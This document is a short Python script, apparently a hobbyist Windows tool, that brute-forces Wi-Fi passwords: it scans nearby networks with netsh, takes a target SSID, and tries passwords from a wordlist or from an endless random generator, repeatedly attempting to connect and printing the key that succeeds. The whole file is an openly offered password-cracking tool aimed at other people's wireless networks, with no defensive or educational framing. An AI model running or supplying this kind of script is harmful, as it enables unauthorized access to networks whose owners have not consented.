import subprocess
from termcolor import colored
import random
import string
def print_logo():
    logo = """
    ██╗      █████╗ ██╗  ██╗ █████╗ ███████╗ █████╗     ██╗    ██╗ ██╗ ██╗████╗  ██╗ 
    ██║     ██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██║    ██║ ██║ ██║════╝  ██║ 
    ██║     ███████║█████╔╝ ███████║███████╗███████║    ██║ █╗ ██║ ██║ ██║████╗  ██║ 
    ██║     ██╔══██║██╔═██╗ ██╔══██║╚════██║██╔══██║    ██║███╗██║ ██║ ██║════╝  ██║ 
    ███████╗██║  ██║██║  ██╗██║  ██║███████║██║  ██║    ╚███╔███╔╝ ██║ ██║       ██║
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚══╝╚══╝  ╚═╝ ╚═╝       ╚═╝
    """
    title = "coded by @medjahdi"
    print(colored(logo,"blue"))
    print(colored(title,"green"))
    
def list():
    result = subprocess.run(["netsh", "wlan", "show", "networks"], capture_output=True, text=True)
    if result.returncode != 0:
        print(colored("Failed to scan for networks.","red"))
        return
    print(colored("Available networks:","green"))
    print(result.stdout)

def connect(ssid, password):
    result = subprocess.run(["netsh", "wlan", "connect", f"name={ssid}", f"key={password}"], capture_output=True, text=True)
    if result.returncode != 0:
        print(colored(f"Failed to connect to {ssid} with password {password}.","red"))
        return False
    print(colored(f"Successfully connected to {ssid} with password {password}.","green"))
    return True

def get_wordlist(ssid, wordlist):
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            if connect(ssid, password):
                print(colored(f"Password found: {password}","green"))
                return
    print(colored("Password not found in wordlist.","red"))

def generate_random_password(length):
        characters = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(characters) for i in range(length))

    


if __name__ == "__main__":
    print_logo()
    list()
    ssid = input(colored("Enter the SSID of the network you want to connect to: ", "yellow"))
    choice = input(colored("Would you like to use a wordlist or generate a random password? (wordlist/random): ", "yellow")).strip().lower()
    
    if choice == "wordlist":
        wordlist = input(colored("Enter the path to the wordlist: ", "yellow"))
        get_wordlist(ssid, wordlist)
    elif choice == "random":
        length = int(input(colored("Enter the length of the random password: ", "yellow")))
        while(True):
            password = generate_random_password(length)
            if connect(ssid, password):
                print(colored(f"Password found: {password}","green"))
                break
            else:
                print(colored(f"Failed to connect to {ssid} with password {password}.","red"))
   
    else:
        print(colored("Invalid choice. Please choose 'wordlist' or 'random'.", "red"))